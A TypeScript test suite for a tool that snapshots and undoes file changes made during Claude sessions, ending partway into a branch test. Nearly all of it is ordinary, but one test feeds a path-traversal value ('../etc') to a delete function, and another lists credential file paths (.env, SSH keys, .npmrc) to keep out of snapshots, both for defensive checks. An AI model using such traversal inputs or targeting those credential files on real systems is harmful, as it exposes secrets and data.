// Tests of the time machine against real git and a real file system.
// Run with `npm test` (Node 22+, type stripping).

import { execFile, spawn } from 'node:child_process'
import { chmod, mkdtemp, mkdir, readFile, readlink, rm, stat, symlink, unlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { after, beforeEach, describe, test } from 'node:test'
import assert from 'node:assert/strict'
import vm from 'node:vm'

import {
  METRIC_UNITS,
  describe as describeNode,
  heatText,
  heatTree,
  nodeAt,
  turnsOf,
  valueLabel,
  viewOf,
} from '../src/heat.ts'
import type { FileHeat, Heat } from '../src/heat.ts'
import { heatPage, pageLibrary } from '../src/heat-page.ts'
import { TimeMachine, deleteProject, listProjects } from '../src/index.ts'
import type { Deps, ExecResult } from '../src/index.ts'
import { ago, restoreText, summaryLine, turnSummary } from '../src/format.ts'
import { firstLine } from '../src/message.ts'
import { versionProblem } from '../src/version.ts'
import {
  NOT_KEPT,
  SECRET_EXCLUDES,
  alertLine,
  assess,
  findingLines,
  isSecretPath,
  kindOfPath,
  manifestChanges,
} from '../src/sensitive.ts'
import { heatColor, rasterCells, squarify } from '../src/treemap.ts'

const deps: Deps = {
  exec: (argv, init) =>
    new Promise<ExecResult>(resolve => {
      const child = execFile(
        argv[0] ?? '',
        argv.slice(1),
        { cwd: init.cwd, env: { ...process.env, ...init.env }, maxBuffer: 64 * 1024 * 1024, encoding: 'utf8' },
        (error, stdout, stderr) => {
          const code = error && typeof error.code === 'number' ? error.code : error ? 1 : 0
          resolve({ exitCode: code, stdout, stderr })
        },
      )
      child.stdin?.on('error', () => undefined)
      child.stdin?.end(init.stdin ?? '')
    }),
  writeFile: async (path, text) => {
    await mkdir(join(path, '..'), { recursive: true })
    await writeFile(path, text)
  },
}

const sandboxes: string[] = []
after(async () => {
  for (const dir of sandboxes) await rm(dir, { recursive: true, force: true })
})

let root = ''
let store = ''
let tm: TimeMachine
let turns = 0
const SESSION = 'session-a'

async function sh(...argv: string[]): Promise<string> {
  const result = await deps.exec(argv, { cwd: root })
  assert.equal(result.exitCode, 0, `${argv.join(' ')}: ${result.stderr}`)
  return result.stdout
}

const file = (path: string) => join(root, path)
const read = (path: string) => readFile(file(path), 'utf8')
const exists = (path: string) =>
  stat(file(path)).then(
    () => true,
    () => false,
  )

async function put(path: string, text: string | Uint8Array): Promise<void> {
  await mkdir(join(file(path), '..'), { recursive: true })
  await writeFile(file(path), text)
}

/** Runs `work` as one Claude turn of a single Bash call; returns the turn. */
async function turn(prompt: string, work: () => Promise<void>, session = SESSION) {
  const id = `turn-${++turns}`
  await tm.beginTurn(id, prompt, session)
  await bash(work, session)
  return tm.finishTurn(id, session, false, `answer to ${prompt}`)
}

/** One Bash call of Claude's. */
async function bash(work: () => Promise<void>, session = SESSION, command = 'cmd'): Promise<void> {
  await tm.beforeCommand(session)
  await work()
  await tm.afterCommand(command, session)
}

/** One Write call of Claude's. */
async function write(path: string, text: string, session = SESSION): Promise<void> {
  await tm.beforeFileWrite(file(path), session)
  await put(path, text)
  await tm.afterFileWrite(file(path), 'Write', session)
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'tm-project-'))
  store = await mkdtemp(join(tmpdir(), 'tm-store-'))
  sandboxes.push(root, store)
  await sh('git', 'init', '-q')
  await sh('git', 'config', 'user.email', 'test@example.com')
  await sh('git', 'config', 'user.name', 'Test')
  await put('.gitignore', '.env\nbuild/\nnode_modules/\n')
  await put('src/auth.ts', 'A\n')
  await put('src/user.ts', 'user\n')
  await put('src/legacy.ts', 'legacy\n')
  await sh('git', 'add', '-A')
  await sh('git', 'commit', '-qm', 'initial')
  tm = new TimeMachine(deps, root, join(store, 'shadow.git'))
  await tm.init()
})

describe('undoing a turn', () => {
  test("keeps the person's uncommitted work from before the turn", async () => {
    await put('src/auth.ts', 'A\nUSER\n')
    const entry = await turn('touch auth', () => put('src/auth.ts', 'A\nUSER\nCLAUDE\n'))
    assert.ok(entry)
    const report = await tm.undo(entry.id)
    assert.equal(await read('src/auth.ts'), 'A\nUSER\n')
    assert.deepEqual(report.restored, ['src/auth.ts'])
  })

  test('removes created files, recovers deleted ones byte for byte, restores modified ones', async () => {
    const entry = await turn('refactor', async () => {
      await put('src/user.ts', 'user v2\n')
      await put('src/token.ts', 'token\n')
      await unlink(file('src/legacy.ts'))
    })
    assert.ok(entry)
    assert.deepEqual(entry.counts, { added: 1, modified: 1, deleted: 1 })
    const report = await tm.undo(entry.id)
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.equal(await exists('src/token.ts'), false)
    assert.equal(await read('src/legacy.ts'), 'legacy\n')
    assert.deepEqual(report.removed, ['src/token.ts'])
    assert.deepEqual(report.recovered, ['src/legacy.ts'])
  })

  test('leaves the project git index, HEAD and refs untouched', async () => {
    await put('src/auth.ts', 'A\nstaged\n')
    await sh('git', 'add', 'src/auth.ts')
    const before = await sh('git', 'status', '--porcelain=v2')
    const refs = await sh('git', 'for-each-ref')
    const entry = await turn('edit', () => put('src/user.ts', 'changed\n'))
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.equal(await sh('git', 'status', '--porcelain=v2'), before)
    assert.equal(await sh('git', 'for-each-ref'), refs)
  })

  test('reports a conflict instead of overwriting an edit made after the turn', async () => {
    await put('src/auth.ts', 'A\n')
    const entry = await turn('A to B', () => put('src/auth.ts', 'B\n'))
    assert.ok(entry)
    await put('src/auth.ts', 'C\n')
    const report = await tm.undo(entry.id)
    assert.deepEqual(report.conflicts, ['src/auth.ts'])
    assert.equal(await read('src/auth.ts'), 'C\n')
    const forced = await tm.undo(entry.id, true)
    assert.deepEqual(forced.restored, ['src/auth.ts'])
    assert.equal(await read('src/auth.ts'), 'A\n')
  })

  test('undoes an older turn without touching a later one', async () => {
    const first = await turn('first', () => put('src/user.ts', 'first\n'))
    await turn('second', () => put('src/auth.ts', 'second\n'))
    assert.ok(first)
    await tm.undo(first.id)
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.equal(await read('src/auth.ts'), 'second\n')
  })

  test('an undo is itself undoable (redo)', async () => {
    const entry = await turn('edit', () => put('src/user.ts', 'claude\n'))
    assert.ok(entry)
    const undo = await tm.undo(entry.id)
    assert.ok(undo.entry)
    const redo = await tm.undo(undo.entry.id)
    assert.equal(await read('src/user.ts'), 'claude\n')
    assert.equal(redo.entry?.title, 'Redo: edit')
  })

  test('undoing twice is a no-op, not a conflict', async () => {
    const entry = await turn('edit', () => put('src/user.ts', 'claude\n'))
    assert.ok(entry)
    await tm.undo(entry.id)
    const again = await tm.undo(entry.id)
    assert.deepEqual(again.conflicts, [])
    assert.deepEqual(again.unchanged, ['src/user.ts'])
    assert.equal(again.entry, undefined)
  })

  test('restores binary files byte for byte', async () => {
    const bytes = new Uint8Array(4096).map((_, i) => (i * 31 + 7) % 256)
    await put('assets/logo.bin', bytes)
    const entry = await turn('binary', () => put('assets/logo.bin', new Uint8Array([0, 1, 2])))
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.deepEqual(new Uint8Array(await readFile(file('assets/logo.bin'))), bytes)
  })

  test('restores the executable bit and symlinks', async () => {
    await put('run.sh', '#!/bin/sh\n')
    await chmod(file('run.sh'), 0o755)
    await symlink('src/auth.ts', file('link'))
    const entry = await turn('perms', async () => {
      await chmod(file('run.sh'), 0o644)
      await unlink(file('link'))
      await symlink('src/user.ts', file('link'))
    })
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.equal((await stat(file('run.sh'))).mode & 0o111, 0o111)
    assert.equal(await readlink(file('link')), 'src/auth.ts')
  })

  test('catches changes Bash made, renames included', async () => {
    const entry = await turn('mv', () => sh('git', 'mv', 'src/legacy.ts', 'src/modern.ts').then(() => undefined))
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.equal(await read('src/legacy.ts'), 'legacy\n')
    assert.equal(await exists('src/modern.ts'), false)
  })

  test('removes directories a turn created once they are empty', async () => {
    const entry = await turn('scaffold', () => put('new/deep/file.ts', 'x\n'))
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.equal(await exists('new'), false)
  })
})

describe('ignored files', () => {
  test('a small ignored file is snapshotted, so a Bash change to it is undone', async () => {
    tm.keepSecrets(true)
    await put('.env', 'SECRET=old\n')
    const entry = await turn('edit env', () => put('.env', 'SECRET=new\n'))
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: '.env' }])
    await tm.undo(entry.id)
    assert.equal(await read('.env'), 'SECRET=old\n')
  })

  test('a file under an ignored directory is captured when a file tool edits it', async () => {
    await put('build/config.json', '{"old":true}\n')
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'edit build config', SESSION)
    await write('build/config.json', '{"new":true}\n')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'build/config.json' }])
    await tm.undo(entry.id)
    assert.equal(await read('build/config.json'), '{"old":true}\n')
  })

  test('an ignored file a file tool creates is removed on undo', async () => {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'create env', SESSION)
    await write('build/new.txt', 'NEW=1\n')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    await tm.undo(entry.id)
    assert.equal(await exists('build/new.txt'), false)
  })

  test('ignored directories and big ignored files stay out of snapshots', async () => {
    await put('node_modules/pkg/index.js', 'v1\n')
    await put('.env', new Uint8Array(2 * 1024 * 1024))
    const entry = await turn('install', async () => {
      await put('node_modules/pkg/index.js', 'v2\n')
      await put('src/user.ts', 'changed\n')
    })
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'src/user.ts' }])
    await tm.undo(entry.id)
    assert.equal(await read('node_modules/pkg/index.js'), 'v2\n')
    assert.equal(await read('src/user.ts'), 'user\n')
  })
})

describe('secrets', () => {
  const shadowFiles = async () => {
    const out = await deps.exec(
      ['git', `--git-dir=${join(store, 'shadow.git')}`, 'log', '--all', '--name-only', '--format='],
      {},
    )
    return new Set(out.stdout.split('\n').filter(Boolean))
  }

  test('are left out of every snapshot by default, and a Bash change to them is not undone', async () => {
    await put('.env', 'SECRET=old\n')
    await put('certs/server.key', 'KEY\n')
    const entry = await turn('edit env', async () => {
      await put('.env', 'SECRET=new\n')
      await put('src/user.ts', 'v2\n')
    })
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'src/user.ts' }])
    await tm.undo(entry.id)
    assert.equal(await read('.env'), 'SECRET=new\n')
    assert.equal(await read('src/user.ts'), 'user\n')
    const files = await shadowFiles()
    assert.equal(files.has('.env') || files.has('certs/server.key'), false)
  })

  test("Claude's file tools writing one are flagged, without keeping it", async () => {
    await put('.env', 'SECRET=old\n')
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'set the key', SESSION)
    await write('.env', 'SECRET=new\n')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    assert.deepEqual(entry.secrets, ['.env'])
    assert.deepEqual(await tm.findings(entry.id), [{ kind: 'secrets', paths: ['.env'], items: [NOT_KEPT] }])
    assert.equal(await tm.undoSensitive(entry.id), undefined)
    assert.equal(await read('.env'), 'SECRET=new\n')
    assert.equal((await shadowFiles()).has('.env'), false)
  })

  test('kept ones are dropped from new snapshots once skipped, and never written back from old ones', async () => {
    tm.keepSecrets(true)
    await put('.env', 'SECRET=old\n')
    const before = await tm.save('before', SESSION)
    assert.ok(before)
    await put('.env', 'SECRET=current\n')
    await put('src/user.ts', 'later\n')
    tm.keepSecrets(false)
    await tm.travel(before.id)
    assert.equal(await read('.env'), 'SECRET=current\n')
    assert.equal(await read('src/user.ts'), 'user\n')
  })

  test('the patterns snapshots leave out name the same files the sensitive-change check calls secrets', async () => {
    const paths = [
      '.env',
      'app/.env.local',
      '.env.example',
      'a/.npmrc',
      'k/id_ed25519',
      'k/id_ed25519.pub',
      'tls/x.pem',
      'notes.md',
      'credentials.json',
    ]
    const excludes = join(store, 'secrets.exclude')
    await writeFile(excludes, `${SECRET_EXCLUDES}\n`)
    const ignored = await deps.exec(
      ['git', '-c', `core.excludesFile=${excludes}`, 'check-ignore', '--no-index', '--stdin'],
      {
        cwd: root,
        stdin: paths.join('\n'),
      },
    )
    assert.deepEqual(
      ignored.stdout.split('\n').filter(Boolean),
      paths.filter(path => isSecretPath(path)),
    )
  })
})

describe('steps and other writers', () => {
  test('a turn is made of steps, and one step can be undone alone', async () => {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'two steps', SESSION)
    await write('src/user.ts', 'step one\n')
    await bash(() => put('src/auth.ts', 'step two\n'), SESSION, 'sed -i auth')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    const steps = await tm.steps(entry.id)
    assert.deepEqual(
      steps.map(step => step.title),
      ['Write src/user.ts', 'Bash: sed -i auth'],
    )
    await tm.undo(steps[1]?.id ?? '')
    assert.equal(await read('src/auth.ts'), 'A\n')
    assert.equal(await read('src/user.ts'), 'step one\n')
  })

  test("an edit someone else makes during a turn is not undone with Claude's", async () => {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'mixed', SESSION)
    await write('src/user.ts', 'claude\n')
    await put('src/auth.ts', 'A\nmine, typed while Claude worked\n')
    await bash(() => put('src/legacy.ts', 'claude too\n'))
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    assert.deepEqual(entry.changes.map(change => change.path).sort(), ['src/legacy.ts', 'src/user.ts'])
    await tm.undo(entry.id)
    assert.equal(await read('src/auth.ts'), 'A\nmine, typed while Claude worked\n')
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.equal(await read('src/legacy.ts'), 'legacy\n')
  })

  test('a file someone else also edited during the turn is a conflict', async () => {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'tainted', SESSION)
    await write('src/user.ts', 'claude\n')
    await put('src/user.ts', 'claude\nand mine\n')
    await bash(async () => undefined)
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    const report = await tm.undo(entry.id)
    assert.deepEqual(report.conflicts, ['src/user.ts'])
    assert.equal(await read('src/user.ts'), 'claude\nand mine\n')
  })

  test('a writer still running after its step is recorded as outside, and undo leaves its writes', async () => {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'codegen in the background', SESSION)
    const go = join(store, 'go')
    // A formatter and a codegen Claude started in the background, which finish
    // after the command returned: they wait until the step is recorded.
    const script = `while [ ! -e '${go}' ]; do sleep 0.02; done; printf 'formatted\\n' > src/user.ts; printf 'gen\\n' > src/gen.ts`
    const writer = spawn('sh', ['-c', script], { cwd: root, stdio: 'ignore' })
    const exited = new Promise<number | null>(resolve => writer.on('exit', resolve))
    await bash(() => put('src/user.ts', 'claude\n'), SESSION, 'npm run codegen &')
    await writeFile(go, '')
    assert.equal(await exited, 0)
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'src/user.ts' }])
    const report = await tm.undo(entry.id)
    assert.deepEqual(report.conflicts, ['src/user.ts'])
    assert.deepEqual(report.restored, [])
    assert.equal(await read('src/user.ts'), 'formatted\n')
    assert.equal(await read('src/gen.ts'), 'gen\n')
  })

  test('two sessions at once: each undo reverts only its own steps', async () => {
    await tm.beginTurn('a1', 'session a', 'session-a')
    await tm.beginTurn('b1', 'session b', 'session-b')
    await write('src/user.ts', 'from a\n', 'session-a')
    await write('src/auth.ts', 'from b\n', 'session-b')
    const a = await tm.finishTurn('a1', 'session-a', false)
    const b = await tm.finishTurn('b1', 'session-b', false)
    assert.ok(a && b)
    assert.deepEqual(a.changes, [{ status: 'modified', path: 'src/user.ts' }])
    assert.deepEqual(b.changes, [{ status: 'modified', path: 'src/auth.ts' }])
    await tm.undo(a.id)
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.equal(await read('src/auth.ts'), 'from b\n')
    const top = (await tm.history()).map(entry => entry.title)
    assert.ok(top.includes('session a') && top.includes('session b'))
  })

  test("a turn keeps Claude's answer", async () => {
    const entry = await turn('explain and fix', () => put('src/user.ts', 'fixed\n'))
    assert.equal(entry?.answer, 'answer to explain and fix')
  })
})

describe('something else writing while a restore runs', () => {
  type Argv = readonly string[]
  const isWrite = (argv: Argv) => argv.includes('checkout') || (argv.includes('rm') && argv.includes('-r'))
  const isRecheck = (argv: Argv) => argv.includes('update-index')

  /**
   * Runs `restore` with another writer that does `write` once, exactly at the
   * first git call `at` picks: before it, or after it returned. Deterministic,
   * no timing involved.
   */
  async function racing<T>(
    at: (argv: Argv) => boolean,
    when: 'before' | 'after',
    write: () => Promise<void>,
    restore: () => Promise<T>,
  ) {
    let isArmed = true
    tm.use({
      ...deps,
      exec: async (argv, init) => {
        const isNow = isArmed && at(argv)
        if (isNow) isArmed = false
        if (isNow && when === 'before') await write()
        const result = await deps.exec(argv, init)
        if (isNow && when === 'after') await write()
        return result
      },
    })
    try {
      return await restore()
    } finally {
      tm.use(deps)
    }
  }

  async function editTurn() {
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'edit', SESSION)
    await write('src/user.ts', 'claude\n')
    const entry = await tm.finishTurn(id, SESSION, false)
    assert.ok(entry)
    return entry
  }

  test('a file written after it was put back makes the undo incomplete, with the path and the diff', async () => {
    const entry = await editTurn()
    const report = await racing(
      isWrite,
      'after',
      () => put('src/user.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(report.unsettled, ['src/user.ts'])
    assert.deepEqual(report.restored, [])
    assert.match(report.drift, /^-user$/m)
    assert.match(report.drift, /^\+late$/m)
    const text = restoreText(report, entry.id)
    assert.match(
      text,
      /^⚠ Incomplete: 1 file changed by something else while restoring, not at the snapshot: src\/user\.ts$/m,
    )
    assert.match(text, /^\+late$/m)
    assert.doesNotMatch(text, /✓|Restored|brought back/)
    assert.equal(report.entry?.title, 'Undo: edit (incomplete)')
    assert.equal(await read('src/user.ts'), 'late\n')
  })

  test('the same undo with no other writer reports as before', async () => {
    const entry = await editTurn()
    const report = await tm.undo(entry.id)
    assert.deepEqual(report.unsettled, [])
    assert.equal(report.drift, '')
    assert.equal(restoreText(report, entry.id), '✓ Restored 1 file')
    assert.equal(report.entry?.title, 'Undo: edit')
  })

  test('a write to a file the undo does not touch leaves it complete', async () => {
    const entry = await editTurn()
    const report = await racing(
      isWrite,
      'after',
      () => put('src/auth.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(report.unsettled, [])
    assert.equal(restoreText(report, entry.id), '✓ Restored 1 file')
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.equal(await read('src/auth.ts'), 'late\n')
  })

  test('a deleted file brought back and deleted again at once makes the undo incomplete', async () => {
    const entry = await turn('delete legacy', () => unlink(file('src/legacy.ts')))
    assert.ok(entry)
    const report = await racing(
      isWrite,
      'after',
      () => unlink(file('src/legacy.ts')),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(report.unsettled, ['src/legacy.ts'])
    assert.deepEqual(report.recovered, [])
    assert.match(report.drift, /^-legacy$/m)
    assert.doesNotMatch(restoreText(report, entry.id), /✓|brought back/)
    assert.equal(await exists('src/legacy.ts'), false)
  })

  test('a created file the undo removed and something wrote again makes it incomplete', async () => {
    const entry = await turn('create', () => put('src/new.ts', 'new\n'))
    assert.ok(entry)
    const report = await racing(
      isWrite,
      'after',
      () => put('src/new.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(report.unsettled, ['src/new.ts'])
    assert.deepEqual(report.removed, [])
    assert.match(report.drift, /^\+late$/m)
  })

  test('a write made after the undo began is kept, not overwritten, and reported', async () => {
    const entry = await editTurn()
    const report = await racing(
      isRecheck,
      'before',
      () => put('src/user.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(report.unsettled, ['src/user.ts'])
    assert.deepEqual(report.restored, [])
    assert.equal(await read('src/user.ts'), 'late\n')
  })

  test('travel checks what landed the same way', async () => {
    const entry = await editTurn()
    const before = entry.base ?? ''
    const report = await racing(
      isWrite,
      'after',
      () => put('src/user.ts', 'late\n'),
      () => tm.travel(before),
    )
    assert.deepEqual(report.unsettled, ['src/user.ts'])
    assert.deepEqual(report.restored, [])
    assert.match(report.drift, /^\+late$/m)
    assert.match(report.entry?.title ?? '', /\(incomplete\)$/)
  })

  test('once the writer has stopped, a forced undo completes, and a redo title drops the mark', async () => {
    const entry = await editTurn()
    const first = await racing(
      isWrite,
      'after',
      () => put('src/user.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    assert.deepEqual(first.unsettled, ['src/user.ts'])
    const forced = await tm.undo(entry.id, true)
    assert.deepEqual(forced.unsettled, [])
    assert.deepEqual(forced.restored, ['src/user.ts'])
    assert.equal(await read('src/user.ts'), 'user\n')
    assert.ok(first.entry)
    const redo = await tm.undo(first.entry.id, true)
    assert.equal(redo.entry?.title, 'Redo: edit')
  })

  test('the band line says it is incomplete without the diff', async () => {
    const entry = await editTurn()
    const report = await racing(
      isWrite,
      'after',
      () => put('src/user.ts', 'late\n'),
      () => tm.undo(entry.id),
    )
    const line = summaryLine(report, entry.id)
    assert.match(line, /^⚠ Incomplete: /)
    assert.doesNotMatch(line, /\n|\+late/)
  })
})

describe('prune and projects', () => {
  test('keeps the newest entries, and they can still be undone', async () => {
    await turn('one', () => put('src/user.ts', 'one\n'))
    await turn('two', () => put('src/user.ts', 'two\n'))
    const three = await turn('three', () => put('src/user.ts', 'three\n'))
    assert.ok(three)
    const report = await tm.prune({ keepLast: 1 })
    assert.ok(report.removed > 0)
    const history = await tm.history()
    assert.deepEqual(
      history.map(entry => entry.kind),
      ['turn', 'baseline'],
    )
    assert.match(history[1]?.title ?? '', /pruned/)
    await tm.undo(history[0]?.id ?? '')
    assert.equal(await read('src/user.ts'), 'two\n')
  })

  test('prunes by age', async () => {
    await turn('old', () => put('src/user.ts', 'old\n'))
    const report = await tm.prune({ olderThanMs: 0 })
    assert.ok(report.removed > 0)
    assert.deepEqual(
      (await tm.history()).map(entry => entry.kind),
      ['baseline'],
    )
    assert.equal(await read('src/user.ts'), 'old\n')
  })

  test('lists and deletes project histories', async () => {
    await turn('one', () => put('src/user.ts', 'one\n'))
    const named = new TimeMachine(deps, root, join(store, '0123456789abcdef.git'))
    await named.init()
    const projects = await listProjects(deps.exec, store)
    assert.equal(projects.length, 1)
    assert.equal(projects[0]?.root, root)
    assert.equal(projects[0]?.isRootPresent, true)
    assert.ok((projects[0]?.bytes ?? 0) > 0)
    await assert.rejects(deleteProject(deps.exec, store, '../etc'))
    await deleteProject(deps.exec, store, '0123456789abcdef.git')
    assert.deepEqual(await listProjects(deps.exec, store), [])
  })
})

describe('history and travel', () => {
  test('records outside changes, turns and undos in order, without empty turns', async () => {
    await put('src/auth.ts', 'mine\n')
    const entry = await turn('first prompt\nmore text', () => put('src/user.ts', 'v2\n'))
    await turn('a question with no edits', async () => undefined)
    assert.ok(entry)
    await tm.undo(entry.id)
    const kinds = (await tm.history()).map(one => `${one.kind}:${one.title}`)
    assert.deepEqual(kinds, [
      'undo:Undo: first prompt',
      'turn:first prompt',
      'outside:Changes outside Claude',
      'baseline:Baseline',
    ])
    assert.equal((await tm.history())[1]?.prompt, 'first prompt\nmore text')
  })

  test('travels the whole workspace back and forward', async () => {
    const one = await turn('one', () => put('src/user.ts', 'one\n'))
    const two = await turn('two', async () => {
      await put('src/user.ts', 'two\n')
      await put('src/extra.ts', 'extra\n')
    })
    assert.ok(one && two)
    await tm.travel(one.id)
    assert.equal(await read('src/user.ts'), 'one\n')
    assert.equal(await exists('src/extra.ts'), false)
    await tm.travel(two.id)
    assert.equal(await read('src/user.ts'), 'two\n')
    assert.equal(await read('src/extra.ts'), 'extra\n')
  })

  test('a turn left open by a crash is recorded as interrupted at the next turn', async () => {
    await tm.beginTurn('crashed', 'never finished', SESSION)
    await bash(() => put('src/user.ts', 'half done\n'))
    const next = await turn('next', () => put('src/auth.ts', 'next\n'))
    assert.ok(next)
    const history = await tm.history()
    const crashed = history.find(one => one.title === 'never finished')
    assert.ok(crashed?.isInterrupted)
    assert.deepEqual(crashed.changes, [{ status: 'modified', path: 'src/user.ts' }])
  })

  test('shows a per-file unified diff', async () => {
    const entry = await turn('diff', () => put('src/user.ts', 'user\nadded\n'))
    assert.ok(entry)
    const diff = await tm.fileDiff(entry.id, 'src/user.ts')
    assert.match(diff, /^\+added$/m)
  })

  test('finishTurn ignores a turn id it did not start (subagents)', async () => {
    await tm.beginTurn('main', 'main', SESSION)
    assert.equal(await tm.finishTurn('subagent', SESSION, false), undefined)
    await bash(() => put('src/user.ts', 'x\n'))
    assert.ok(await tm.finishTurn('main', SESSION, false))
  })
})

describe('fixes found in review', () => {
  test('an old turn beyond the first read window is undone whole', async () => {
    tm = new TimeMachine(deps, root, join(store, 'small-window.git'), 4)
    await tm.init()
    const id = `turn-${++turns}`
    await tm.beginTurn(id, 'long turn', SESSION)
    for (let i = 0; i < 6; i++) await write(`src/f${i}.ts`, `${i}\n`)
    const long = await tm.finishTurn(id, SESSION, false)
    for (let i = 0; i < 6; i++) await turn(`later ${i}`, () => put('src/user.ts', `later ${i}\n`))
    assert.ok(long)
    const found = (await tm.history(50)).find(entry => entry.title === 'long turn')
    assert.equal(found?.steps.length, 6)
    const report = await tm.undo(long.id)
    assert.equal(report.removed.length, 6)
    for (let i = 0; i < 6; i++) assert.equal(await exists(`src/f${i}.ts`), false)
  })

  test('prune keeps the start of a turn that began before a newer one ended', async () => {
    await turn('old', () => put('src/legacy.ts', 'old\n'))
    await tm.beginTurn('slow', 'slow turn', 'session-b')
    await turn('quick', () => put('src/user.ts', 'quick\n'), 'session-a')
    await write('src/auth.ts', 'slow\n', 'session-b')
    const slow = await tm.finishTurn('slow', 'session-b', false)
    assert.ok(slow)
    await tm.prune({ keepLast: 2 })
    const history = await tm.history()
    const kept = history.find(entry => entry.title === 'slow turn')
    assert.ok(kept)
    assert.deepEqual(kept.changes, [{ status: 'modified', path: 'src/auth.ts' }])
    await tm.undo(kept.id)
    assert.equal(await read('src/auth.ts'), 'A\n')
  })

  test('undo, redo, then undoing the redo is an undo again', async () => {
    const entry = await turn('edit', () => put('src/user.ts', 'claude\n'))
    assert.ok(entry)
    const undo = await tm.undo(entry.id)
    assert.equal(undo.entry?.title, 'Undo: edit')
    const redo = await tm.undo(undo.entry?.id ?? '')
    assert.equal(redo.entry?.title, 'Redo: edit')
    const again = await tm.undo(redo.entry?.id ?? '')
    assert.equal(again.entry?.title, 'Undo: edit')
    assert.equal(await read('src/user.ts'), 'user\n')
  })
})

describe('checkpoints and .tmignore', () => {
  test('a saved checkpoint is found by name and travelled to', async () => {
    await put('src/user.ts', 'before refactor\n')
    const saved = await tm.save('before refactor', SESSION)
    assert.equal(saved?.kind, 'checkpoint')
    await turn('refactor', () => put('src/user.ts', 'after\n'))
    const found = await tm.findCheckpoint('Before Refactor')
    assert.equal(found?.id, saved?.id)
    await tm.travel(found?.id ?? '')
    assert.equal(await read('src/user.ts'), 'before refactor\n')
  })

  test('saving twice with nothing changed still makes two bookmarks', async () => {
    const first = await tm.save('one', null)
    const second = await tm.save('two', null)
    assert.ok(first && second && first.id !== second.id)
  })

  test('.tmignore keeps paths out of snapshots, small ignored files included', async () => {
    await put('.tmignore', 'data/\n.env\n')
    await put('.env', 'SECRET=1\n')
    const entry = await turn('touch', async () => {
      await put('data/big.csv', 'a,b\n')
      await put('.env', 'SECRET=2\n')
      await put('src/user.ts', 'changed\n')
    })
    assert.ok(entry)
    assert.deepEqual(entry.changes, [{ status: 'modified', path: 'src/user.ts' }])
    await tm.undo(entry.id)
    assert.equal(await read('.env'), 'SECRET=2\n')
    assert.equal(await read('data/big.csv'), 'a,b\n')
  })
})

describe('taking snapshots into the project repository', () => {
  test("/tm commit commits Claude's files of a turn, as the turn left them", async () => {
    await put('src/auth.ts', 'A\nmine, uncommitted\n')
    const entry = await turn('add token', async () => {
      await put('src/token.ts', 'token\n')
      await put('src/user.ts', 'user v2\n')
      await unlink(file('src/legacy.ts'))
    })
    assert.ok(entry)
    const before = await sh('git', 'rev-parse', 'HEAD')
    const report = await tm.commitTo(entry.id, undefined, false)
    assert.equal(await sh('git', 'rev-parse', 'HEAD^'), before)
    assert.equal((await sh('git', 'log', '-1', '--format=%s')).trim(), 'add token')
    assert.deepEqual((await sh('git', 'show', '--name-status', '--format=', 'HEAD')).trim().split('\n').sort(), [
      'A\tsrc/token.ts',
      'D\tsrc/legacy.ts',
      'M\tsrc/user.ts',
    ])
    assert.deepEqual(report.committed.sort(), ['src/legacy.ts', 'src/token.ts', 'src/user.ts'])
    // Only the person's own edit is left over, unstaged; the work tree is untouched.
    assert.equal(await sh('git', 'status', '--porcelain'), ' M src/auth.ts\n')
    assert.equal(await read('src/auth.ts'), 'A\nmine, uncommitted\n')
  })

  test('/tm commit skips files the project ignores', async () => {
    tm.keepSecrets(true)
    const entry = await turn('env and code', async () => {
      await put('.env', 'SECRET=1\n')
      await put('src/user.ts', 'v2\n')
    })
    assert.ok(entry)
    const report = await tm.commitTo(entry.id, 'code only', false)
    assert.deepEqual(report.skipped, ['.env'])
    assert.equal((await sh('git', 'show', '--name-only', '--format=', 'HEAD')).trim(), 'src/user.ts')
  })

  test('/tm commit refuses to replace staged changes unless forced', async () => {
    const entry = await turn('edit', () => put('src/user.ts', 'claude\n'))
    assert.ok(entry)
    await put('src/user.ts', 'staged by me\n')
    await sh('git', 'add', 'src/user.ts')
    await assert.rejects(tm.commitTo(entry.id, undefined, false), /Staged changes to src\/user.ts/)
    await tm.commitTo(entry.id, undefined, true)
    assert.equal(await sh('git', 'show', 'HEAD:src/user.ts'), 'claude\n')
  })

  test('/tm branch makes a branch of the whole snapshot and leaves HEAD alone', async () => {
